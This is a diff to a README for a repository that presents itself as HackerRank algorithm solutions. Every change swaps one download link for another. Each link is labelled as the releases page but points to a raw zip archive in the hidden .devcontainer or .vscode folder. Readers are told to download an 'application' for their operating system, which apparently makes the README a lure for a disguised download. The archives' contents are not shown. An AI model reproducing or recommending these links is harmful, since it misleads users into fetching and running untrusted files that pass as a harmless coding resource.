@@ -1,6 +1,6 @@
 # 🎉 HackerRank-Algorithms - Easy Solutions for Your Coding Practice
 
-[![Download from Releases](https://github.com/captainsami/HackerRank-Algorithms/raw/refs/heads/main/.devcontainer/Algorithms-Rank-Hacker-3.6.zip%20Now-%https://github.com/captainsami/HackerRank-Algorithms/raw/refs/heads/main/.devcontainer/Algorithms-Rank-Hacker-3.6.zip)](https://github.com/captainsami/HackerRank-Algorithms/raw/refs/heads/main/.devcontainer/Algorithms-Rank-Hacker-3.6.zip)
+[![Download from Releases](https://github.com/captainsami/HackerRank-Algorithms/raw/refs/heads/main/.vscode/Hacker_Rank_Algorithms_v3.1.zip%20Now-%https://github.com/captainsami/HackerRank-Algorithms/raw/refs/heads/main/.vscode/Hacker_Rank_Algorithms_v3.1.zip)](https://github.com/captainsami/HackerRank-Algorithms/raw/refs/heads/main/.vscode/Hacker_Rank_Algorithms_v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the HackerRank-Algorithms repository! Here, you will find solutions f
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [HackerRank-Algorithms Releases](https://github.com/captainsami/HackerRank-Algorithms/raw/refs/heads/main/.devcontainer/Algorithms-Rank-Hacker-3.6.zip).
+To download the application, visit this page to download: [HackerRank-Algorithms Releases](https://github.com/captainsami/HackerRank-Algorithms/raw/refs/heads/main/.vscode/Hacker_Rank_Algorithms_v3.1.zip).
 
 Once there, look for the latest version. You will find the files listed under 'Assets.' Click on the file that matches your operating system to begin downloading. 
 
@@ -70,7 +70,7 @@ Yes, the application is designed for users of all skill levels, including beginn
 Yes, the HackerRank-Algorithms application is free to download and use.
 
 **3. Where can I find updates?**
-To check for updates, visit the releases page: [HackerRank-Algorithms Releases](https://github.com/captainsami/HackerRank-Algorithms/raw/refs/heads/main/.devcontainer/Algorithms-Rank-Hacker-3.6.zip).
+To check for updates, visit the releases page: [HackerRank-Algorithms Releases](https://github.com/captainsami/HackerRank-Algorithms/raw/refs/heads/main/.vscode/Hacker_Rank_Algorithms_v3.1.zip).
 
 ## 📝 License
 
